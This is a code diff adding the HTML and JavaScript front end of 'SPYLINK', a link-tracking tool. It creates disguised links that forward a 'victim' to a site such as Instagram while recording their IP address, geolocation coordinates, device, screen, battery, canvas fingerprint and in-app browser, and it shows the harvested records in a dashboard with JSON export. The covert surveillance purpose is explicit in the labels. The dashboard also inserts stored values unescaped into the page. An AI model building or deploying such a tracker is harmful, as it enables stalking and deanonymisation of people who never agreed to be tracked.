@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>⌁ SPYLINK — Advanced Tracker</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0a0f;--card:#0d0d18;--border:#1a1a2e;
+  --accent:#00ff9d;--accent2:#7b2fff;--accent3:#ff2d55;
+  --text:#e0e0f0;--muted:#5a5a8a;--glow:0 0 20px #00ff9d44;
+}
+body{background:var(--bg);color:var(--text);font-family:system-ui,sans-serif;min-height:100vh;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;background-image:
+  linear-gradient(rgba(0,255,157,.03) 1px,transparent 1px),
+  linear-gradient(90deg,rgba(0,255,157,.03) 1px,transparent 1px);
+  background-size:40px 40px;pointer-events:none;z-index:0}
+body::after{content:"";position:fixed;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.08) 2px,rgba(0,0,0,.08) 4px);
+  pointer-events:none;z-index:9999}
+.container{max-width:900px;margin:0 auto;padding:20px;position:relative;z-index:1}
+header{text-align:center;padding:40px 0 30px}
+.logo{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:8px}
+.logo svg{width:48px;height:48px;filter:drop-shadow(0 0 12px var(--accent))}
+.logo h1{font-size:2.4rem;letter-spacing:6px;background:linear-gradient(90deg,var(--accent),var(--accent2));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
+.tagline{color:var(--muted);font-size:.85rem;letter-spacing:3px;text-transform:uppercase}
+.tabs{display:flex;gap:4px;margin-bottom:24px;background:var(--card);border-radius:12px;padding:4px;border:1px solid var(--border)}
+.tab{flex:1;padding:12px;text-align:center;border-radius:8px;cursor:pointer;
+  font-size:.85rem;letter-spacing:2px;text-transform:uppercase;transition:.3s;color:var(--muted)}
+.tab.active{background:linear-gradient(135deg,rgba(0,255,157,.15),rgba(123,47,255,.15));
+  color:var(--accent);box-shadow:var(--glow)}
+.tab svg{width:16px;height:16px;vertical-align:middle;margin-right:6px}
+.panel{display:none;animation:fadeUp .4s ease}
+.panel.active{display:block}
+@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:28px;margin-bottom:20px;
+  position:relative;overflow:hidden}
+.card::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3))}
+.card h2{font-size:1rem;letter-spacing:3px;text-transform:uppercase;color:var(--accent);margin-bottom:16px;
+  display:flex;align-items:center;gap:10px}
+.card h2 svg{width:20px;height:20px}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:.75rem;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
+.field input,.field select{width:100%;padding:14px 16px;background:#08080f;border:1px solid var(--border);
+  border-radius:10px;color:var(--text);font-size:.95rem;outline:none;transition:.3s}
+.field input:focus,.field select:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,255,157,.1)}
+.field input::placeholder{color:#333}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.btn{width:100%;padding:16px;border:none;border-radius:10px;font-size:1rem;font-weight:700;
+  letter-spacing:3px;text-transform:uppercase;cursor:pointer;transition:.3s;position:relative;overflow:hidden}
+.btn-primary{background:linear-gradient(135deg,var(--accent),#00cc7d);color:#000;
+  box-shadow:0 4px 24px rgba(0,255,157,.3)}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 32px rgba(0,255,157,.4)}
+.btn-primary:active{transform:scale(.98)}
+.btn-danger{background:linear-gradient(135deg,var(--accent3),#cc0033);color:#fff;box-shadow:0 4px 20px rgba(255,45,85,.3)}
+.btn-secondary{background:rgba(123,47,255,.2);color:var(--accent2);border:1px solid rgba(123,47,255,.3)}
+.btn svg{width:18px;height:18px;vertical-align:middle;margin-right:8px}
+.result-box{display:none;margin-top:20px;padding:20px;background:#08080f;border:1px solid var(--accent);
+  border-radius:10px;position:relative}
+.result-box.show{display:block;animation:fadeUp .3s ease}
+.result-box .label{font-size:.7rem;color:var(--accent);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px}
+.result-box .link{font-size:1rem;color:#fff;word-break:break-all;font-family:monospace;
+  background:rgba(0,255,157,.05);padding:12px;border-radius:6px;margin-bottom:12px;cursor:pointer}
+.result-box .link:hover{text-decoration:underline}
+.copy-btn{position:absolute;top:12px;right:12px;padding:8px 14px;background:var(--accent);color:#000;
+  border:none;border-radius:6px;font-size:.75rem;font-weight:700;cursor:pointer;letter-spacing:1px}
+.copy-btn:hover{background:#00cc7d}
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;text-align:center}
+.stat-card .num{font-size:1.8rem;font-weight:900;color:var(--accent)}
+.stat-card .lbl{font-size:.65rem;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-top:4px}
+.stat-card.purple .num{color:var(--accent2)}
+.stat-card.red .num{color:var(--accent3)}
+.stat-card.blue .num{color:#4db8ff}
+.table-wrap{overflow-x:auto;border-radius:10px;border:1px solid var(--border)}
+table{width:100%;border-collapse:collapse;font-size:.82rem}
+thead{background:rgba(0,255,157,.05)}
+th{padding:12px 14px;text-align:left;font-size:.7rem;letter-spacing:2px;text-transform:uppercase;
+  color:var(--accent);border-bottom:1px solid var(--border)}
+td{padding:10px 14px;border-bottom:1px solid rgba(26,26,46,.5);color:var(--text)}
+tr:hover td{background:rgba(0,255,157,.02)}
+.badge{display:inline-block;padding:3px 8px;border-radius:4px;font-size:.65rem;font-weight:700;letter-spacing:1px}
+.badge-ios{background:rgba(0,255,157,.15);color:var(--accent)}
+.badge-android{background:rgba(123,47,255,.15);color:var(--accent2)}
+.badge-desktop{background:rgba(77,184,255,.15);color:#4db8ff}
+.badge-whatsapp{background:rgba(37,211,102,.15);color:#25d366}
+.badge-instagram{background:rgba(225,48,108,.15);color:#e1306c}
+.badge-twitter{background:rgba(29,161,242,.15);color:#1da1f2}
+.badge-facebook{background:rgba(24,119,242,.15);color:#1877f2}
+.badge-telegram{background:rgba(0,136,204,.15);color:#0088cc}
+.badge-safari{background:rgba(0,180,255,.15);color:#00b4ff}
+.badge-chrome{background:rgba(66,133,244,.15);color:#4285f4}
+.badge-firefox{background:rgba(255,107,53,.15);color:#ff6b35}
+.badge-opera{background:rgba(235,41,41,.15);color:#eb2929}
+.empty{text-align:center;padding:60px 20px;color:var(--muted)}
+.empty svg{width:64px;height:64px;opacity:.3;margin-bottom:16px}
+.empty p{font-size:.85rem}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:1000;
+  align-items:center;justify-content:center;padding:20px}
+.modal-overlay.show{display:flex}
+.modal{background:var(--card);border:1px solid var(--border);border-radius:16px;max-width:500px;width:100%;
+  max-height:80vh;overflow-y:auto;padding:28px;position:relative;animation:fadeUp .3s ease}
+.modal-close{position:absolute;top:16px;right:16px;background:none;border:none;cursor:pointer;
+  color:var(--muted);transition:.3s}
+.modal-close:hover{color:var(--accent3)}
+.modal h3{font-size:1rem;letter-spacing:2px;text-transform:uppercase;color:var(--accent);margin-bottom:20px}
+.detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border)}
+.detail-row:last-child{border:none}
+.detail-label{font-size:.75rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px}
+.detail-value{font-size:.85rem;color:#fff;text-align:right;max-width:60%;word-break:break-all}
+footer{text-align:center;padding:40px;color:var(--muted);font-size:.7rem;letter-spacing:2px}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--accent);margin-right:6px;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--accent)}
+@media(max-width:600px){
+  .stats-grid{grid-template-columns:repeat(2,1fr)}
+  .row{grid-template-columns:1fr}
+  .logo h1{font-size:1.6rem;letter-spacing:4px}
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <header>
+    <div class="logo">
+      <svg viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="22" stroke="url(#g1)" stroke-width="2"/>
+        <circle cx="24" cy="24" r="6" fill="url(#g1)"/>
+        <ellipse cx="24" cy="24" rx="22" ry="10" stroke="url(#g1)" stroke-width="1.5" opacity=".5"/>
+        <ellipse cx="24" cy="24" rx="10" ry="22" stroke="url(#g1)" stroke-width="1.5" opacity=".5"/>
+        <line x1="24" y1="2" x2="24" y2="10" stroke="url(#g1)" stroke-width="1.5"/>
+        <line x1="24" y1="38" x2="24" y2="46" stroke="url(#g1)" stroke-width="1.5"/>
+        <line x1="2" y1="24" x2="10" y2="24" stroke="url(#g1)" stroke-width="1.5"/>
+        <line x1="38" y1="24" x2="46" y2="24" stroke="url(#g1)" stroke-width="1.5"/>
+        <defs><linearGradient id="g1" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#00ff9d"/><stop offset="1" stop-color="#7b2fff"/></linearGradient></defs>
+      </svg>
+      <h1>SPYLINK</h1>
+    </div>
+    <p class="tagline"><span class="dot"></span>Advanced Link Intelligence System &mdash; v5.0</p>
+  </header>
+
+  <div class="tabs">
+    <div class="tab active" onclick="switchTab('generator')">
+      <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 2a5 5 0 110 10A5 5 0 018 3zm0 1.5a3.5 3.5 0 100 7 3.5 3.5 0 000-7zm0 1.5a2 2 0 110 4 2 2 0 010-4z"/></svg>
+      Generator
+    </div>
+    <div class="tab" onclick="switchTab('dashboard')">
+      <svg viewBox="0 0 16 16" fill="currentColor"><path d="M1 3h14v2H1V3zm0 4h14v2H1V7zm0 4h14v2H1v-2z"/></svg>
+      Dashboard
+    </div>
+  </div>
+
+  <div id="panel-generator" class="panel active">
+    <div class="card">
+      <h2>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M13.586 3.586a2 2 0 112.828 2.828l-.793.793-2.828-2.828.793-.793zM11.379 5.793L3 14.172V11h8.172l4.207-4.207-4.007-4.007z"/></svg>
+        Create Spy Link
+      </h2>
+      <div class="field">
+        <label>Target URL (where victim will go)</label>
+        <input type="url" id="targetUrl" placeholder="https://www.instagram.com/" autocomplete="off">
+      </div>
+      <div class="field">
+        <label>Campaign Alias (optional)</label>
+        <input type="text" id="campaignAlias" placeholder="e.g. campaign-001" maxlength="30">
+      </div>
+      <div class="row">
+        <div class="field">
+          <label>Link Alias (custom slug)</label>
+          <input type="text" id="linkAlias" placeholder="random or custom" maxlength="20">
+        </div>
+        <div class="field">
+          <label>Expiry (hours)</label>
+          <select id="expiry">
+            <option value="1">1 Hour</option>
+            <option value="6">6 Hours</option>
+            <option value="24" selected>24 Hours</option>
+            <option value="168">7 Days</option>
+            <option value="720">30 Days</option>
+            <option value="0">Never Expire</option>
+          </select>
+        </div>
+      </div>
+      <div class="field">
+        <label>Tracking Options</label>
+        <div style="display:flex;gap:16px;flex-wrap:wrap;margin-top:6px">
+          <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:.82rem;color:var(--text)">
+            <input type="checkbox" id="trackGeo" checked> <span style="color:var(--muted)">Geo Location</span>
+          </label>
+          <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:.82rem;color:var(--text)">
+            <input type="checkbox" id="trackIP" checked> <span style="color:var(--muted)">IP Address</span>
+          </label>
+          <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:.82rem;color:var(--text)">
+            <input type="checkbox" id="trackScreen" checked> <span style="color:var(--muted)">Screen Info</span>
+          </label>
+          <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:.82rem;color:var(--text)">
+            <input type="checkbox" id="trackBattery" checked> <span style="color:var(--muted)">Battery</span>
+          </label>
+          <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:.82rem;color:var(--text)">
+            <input type="checkbox" id="trackCanvas"> <span style="color:var(--muted)">Canvas Fingerprint</span>
+          </label>
+        </div>
+      </div>
+      <button class="btn btn-primary" onclick="generateLink()" style="margin-top:8px">
+        <svg viewBox="0 0 18 18" fill="currentColor"><path d="M3 4h12a1 1 0 010 2H3a1 1 0 010-2zm0 4h12a1 1 0 010 2H3a1 1 0 010-2zm0 4h8a1 1 0 010 2H3a1 1 0 010-2z"/></svg>
+        Generate Link
+      </button>
+    </div>
+    <div id="resultBox" class="result-box">
+      <button class="copy-btn" onclick="copyLink()">COPY</button>
+      <div class="label">Your Spy Link</div>
+      <div id="resultLink" class="link" onclick="copyLink()" style="cursor:pointer"></div>
+      <div style="display:flex;gap:10px;margin-top:12px">
+        <button class="btn btn-secondary" style="flex:1;font-size:.75rem;padding:10px" onclick="previewLink()">Preview</button>
+        <button class="btn btn-secondary" style="flex:1;font-size:.75rem;padding:10px" onclick="generateLink()">New Link</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="panel-dashboard" class="panel">
+    <div class="stats-grid">
+      <div class="stat-card"><div class="num" id="statLinks">0</div><div class="lbl">Links</div></div>
+      <div class="stat-card purple"><div class="num" id="statClicks">0</div><div class="lbl">Clicks</div></div>
+      <div class="stat-card red"><div class="num" id="statUnique">0</div><div class="lbl">Unique</div></div>
+      <div class="stat-card blue"><div class="num" id="statApps">0</div><div class="lbl">Apps Detected</div></div>
+    </div>
+    <div class="card">
+      <h2>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M10 2a8 8 0 100 16 8 8 0 000-16zm1 11H9v-2h2v2zm0-4H9V5h2v4z"/></svg>
+        Click History
+        <span style="font-size:.65rem;color:var(--muted);letter-spacing:1px;margin-left:auto;font-weight:400">
+          <span class="dot"></span>LIVE
+        </span>
+      </h2>
+      <div class="table-wrap">
+        <table>
+          <thead><tr>
+            <th>Time</th><th>Link</th><th>Target</th><th>Device</th><th>OS</th><th>Browser</th><th>IP</th><th>Actions</th>
+          </tr></thead>
+          <tbody id="clickTable"></tbody>
+        </table>
+      </div>
+      <div id="emptyState" class="empty" style="display:none">
+        <svg viewBox="0 0 64 64" fill="currentColor"><path d="M32 4a28 28 0 100 56 28 28 0 000-56zm0 8a2 2 0 012 2v16a2 2 0 01-4 0V14a2 2 0 012-2zm0 24a2 2 0 012 2v6a2 2 0 01-4 0v-6a2 2 0 012-2z"/></svg>
+        <p>No clicks yet. Send your spy link to start tracking.</p>
+      </div>
+      <div style="margin-top:16px;display:flex;gap:10px">
+        <button class="btn btn-danger" style="flex:1;font-size:.75rem;padding:12px" onclick="clearAll()">Clear All Data</button>
+        <button class="btn btn-secondary" style="flex:1;font-size:.75rem;padding:12px" onclick="exportData()">Export JSON</button>
+      </div>
+    </div>
+  </div>
+
+  <footer>SPYLINK v5.0 — Advanced Intelligence</footer>
+</div>
+
+<div id="detailModal" class="modal-overlay" onclick="if(event.target===this)closeModal()">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal()">
+      <svg viewBox="0 0 16 16" fill="currentColor" style="width:20px;height:20px"><path d="M4.646 4.646a.5.5 0 01.708 0L8 7.293l2.646-2.647a.5.5 0 01.708.708L8.707 8l2.647 2.646a.5.5 0 01-.708.708L8 8.707l-2.646 2.647a.5.5 0 01-.708-.708L7.293 8 4.646 5.354a.5.5 0 010-.708z"/></svg>
+    </button>
+    <h3>Click Details</h3>
+    <div id="modalContent"></div>
+  </div>
+</div>
+
+<script>
+const API = '/api';
+
+function detectOS(ua) {
+  if (/Windows NT 10/.test(ua)) return {name:'Windows',badge:'badge-desktop'};
+  if (/Windows/.test(ua)) return {name:'Windows',badge:'badge-desktop'};
+  if (/Android/.test(ua)) return {name:'Android',badge:'badge-android'};
+  if (/iPhone|iPad|iPod/.test(ua)) return {name:'iOS',badge:'badge-ios'};
+  if (/Macintosh/.test(ua)) return {name:'macOS',badge:'badge-desktop'};
+  if (/Linux/.test(ua)) return {name:'Linux',badge:'badge-desktop'};
+  return {name:'Unknown',badge:'badge-desktop'};
+}
+
+function detectBrowser(ua) {
+  if (/SamsungBrowser/.test(ua)) return {name:'Samsung',badge:'badge-android'};
+  if (/Chrome/.test(ua) && !/Edg/.test(ua)) return {name:'Chrome',badge:'badge-chrome'};
+  if (/Firefox/.test(ua)) return {name:'Firefox',badge:'badge-firefox'};
+  if (/Safari/.test(ua) && !/Chrome/.test(ua)) return {name:'Safari',badge:'badge-safari'};
+  if (/Edg/.test(ua)) return {name:'Edge',badge:'badge-chrome'};
+  if (/OPR/.test(ua) || /Opera/.test(ua)) return {name:'Opera',badge:'badge-opera'};
+  return {name:'Unknown',badge:'badge-desktop'};
+}
+
+function detectApps(ua) {
+  const apps = [];
+  const lower = ua.toLowerCase();
+  if (/whatsapp/.test(lower)) apps.push('WhatsApp');
+  if (/instagram/.test(lower)) apps.push('Instagram');
+  if (/facebook/.test(lower)) apps.push('Facebook');
+  if (/twitter|x-twitter/.test(lower)) apps.push('Twitter/X');
+  if (/telegram/.test(lower)) apps.push('Telegram');
+  if (/tiktok/.test(lower)) apps.push('TikTok');
+  if (/snapchat/.test(lower)) apps.push('Snapchat');
+  if (/spotify/.test(lower)) apps.push('Spotify');
+  return apps;
+}
+
+function fmtTime(ts) {
+  return new Date(ts).toLocaleString('en-IN', {day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'});
+}
+
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach((t, i) => {
+    t.classList.toggle('active', (name === 'generator' && i === 0) || (name === 'dashboard' && i === 1));
+  });
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('panel-' + name).classList.add('active');
+  if (name === 'dashboard') refreshDashboard();
+}
+
+async function generateLink() {
+  const targetUrl = document.getElementById('targetUrl').value.trim();
+  if (!targetUrl) { alert('Enter a target URL'); return; }
+  try { new URL(targetUrl); } catch { alert('Invalid URL'); return; }
+
+  const alias = document.getElementById('linkAlias').value.trim();
+  const campaign = document.getElementById('campaignAlias').value.trim();
+  const expiry = parseInt(document.getElementById('expiry').value);
+  const tracking = {
+    geo: document.getElementById('trackGeo').checked,
+    ip: document.getElementById('trackIP').checked,
+    screen: document.getElementById('trackScreen').checked,
+    battery: document.getElementById('trackBattery').checked,
+    canvas: document.getElementById('trackCanvas').checked
+  };
+
+  try {
+    const res = await fetch(API + '/links', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ target: targetUrl, alias, campaign, expiry, tracking })
+    });
+    const data = await res.json();
+    document.getElementById('resultLink').textContent = data.url;
+    document.getElementById('resultBox').classList.add('show');
+  } catch (e) {
+    alert('Server error: ' + e.message);
+  }
+}
+
+function copyLink() {
+  const txt = document.getElementById('resultLink').textContent;
+  navigator.clipboard.writeText(txt).then(() => {
+    const btn = document.querySelector('.copy-btn');
+    btn.textContent = 'COPIED!';
+    setTimeout(() => btn.textContent = 'COPY', 2000);
+  });
+}
+
+function previewLink() {
+  const link = document.getElementById('resultLink').textContent;
+  if (link) window.open(link, '_blank');
+}
+
+async function refreshDashboard() {
+  try {
+    const [linksRes, clicksRes] = await Promise.all([
+      fetch(API + '/links'),
+      fetch(API + '/clicks')
+    ]);
+    const links = await linksRes.json();
+    const clicks = await clicksRes.json();
+    const uniqueIPs = new Set(clicks.map(c => c.ip).filter(Boolean)).size;
+    const allApps = new Set(clicks.flatMap(c => c.apps || []).filter(Boolean));
+
+    document.getElementById('statLinks').textContent = links.length;
+    document.getElementById('statClicks').textContent = clicks.length;
+    document.getElementById('statUnique').textContent = uniqueIPs;
+    document.getElementById('statApps').textContent = allApps.size;
+
+    const tbody = document.getElementById('clickTable');
+    const empty = document.getElementById('emptyState');
+
+    if (clicks.length === 0) {
+      tbody.innerHTML = '';
+      empty.style.display = 'block';
+      return;
+    }
+    empty.style.display = 'none';
+
+    tbody.innerHTML = clicks.map((c, i) => {
+      const os = detectOS(c.ua);
+      const br = detectBrowser(c.ua);
+      return `<tr>
+        <td style="white-space:nowrap">${fmtTime(c.time)}</td>
+        <td><strong style="color:var(--accent)">${c.slug}</strong></td>
+        <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${c.target}">${c.target}</td>
+        <td>${c.device || 'N/A'}</td>
+        <td><span class="badge ${os.badge}">${os.name}</span></td>
+        <td><span class="badge ${br.badge}">${br.name}</span></td>
+        <td style="font-family:monospace;font-size:.78rem">${c.ip || 'N/A'}</td>
+        <td><button style="background:var(--accent);color:#000;border:none;border-radius:4px;padding:4px 10px;font-size:.7rem;font-weight:700;cursor:pointer" onclick="showDetail(${i})">VIEW</button></td>
+      </tr>`;
+    }).join('');
+  } catch (e) {
+    console.error('Dashboard error:', e);
+  }
+}
+
+function showDetail(idx) {
+  fetch(API + '/clicks').then(r => r.json()).then(clicks => {
+    const c = clicks[idx];
+    const geo = c.geo || {};
+    document.getElementById('modalContent').innerHTML = `
+      <div class="detail-row"><span class="detail-label">Timestamp</span><span class="detail-value">${fmtTime(c.time)}</span></div>
+      <div class="detail-row"><span class="detail-label">IP Address</span><span class="detail-value" style="color:var(--accent)">${c.ip || 'N/A'}</span></div>
+      <div class="detail-row"><span class="detail-label">Location</span><span class="detail-value">${[geo.city, geo.region, geo.country].filter(Boolean).join(', ') || 'N/A'}</span></div>
+      <div class="detail-row"><span class="detail-label">Coordinates</span><span class="detail-value">${geo.lat ? geo.lat.toFixed(4) + ', ' + geo.lon.toFixed(4) : 'N/A'}</span></div>
+      <div class="detail-row"><span class="detail-label">Device</span><span class="detail-value">${c.device || 'N/A'}</span></div>
+      <div class="detail-row"><span class="detail-label">OS</span><span class="detail-value">${detectOS(c.ua).name}</span></div>
+      <div class="detail-row"><span class="detail-label">Browser</span><span class="detail-value">${detectBrowser(c.ua).name}</span></div>
+      <div class="detail-row"><span class="detail-label">Screen</span><span class="detail-value">${c.screen || 'N/A'}</span></div>
+      <div class="detail-row"><span class="detail-label">Battery</span><span class="detail-value">${c.battery ? c.battery.level + (c.battery.charging ? ' ⚡' : '') : 'N/A'}</span></div>
+      <div class="detail-row"><span class="detail-label">Canvas FP</span><span class="detail-value" style="font-family:monospace">${c.canvas || 'N/A'}</span></div>
+      <div class="detail-row"><span class="detail-label">Apps</span><span class="detail-value">${(c.apps || []).map(a => `<span class="badge badge-whatsapp" style="margin:2px">${a}</span>`).join(' ') || 'None'}</span></div>
+      <div class="detail-row"><span class="detail-label">Target URL</span><span class="detail-value" style="font-size:.75rem"><a href="${c.target}" target="_blank" style="color:var(--accent)">${c.target}</a></span></div>
+    `;
+    document.getElementById('detailModal').classList.add('show');
+  });
+}
+
+function closeModal() { document.getElementById('detailModal').classList.remove('show'); }
+
+async function clearAll() {
+  if (!confirm('Delete ALL links and click data?')) return;
+  await fetch(API + '/clear', { method: 'DELETE' });
+  refreshDashboard();
+}
+
+async function exportData() {
+  const [links, clicks] = await Promise.all([
+    fetch(API + '/links').then(r => r.json()),
+    fetch(API + '/clicks').then(r => r.json())
+  ]);
+  const blob = new Blob([JSON.stringify({ links, clicks }, null, 2)], {type: 'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'spylink_data_' + new Date().toISOString().slice(0, 10) + '.json';
+  a.click();
+}
+
+refreshDashboard();
+</script>
+</body>
+</html>
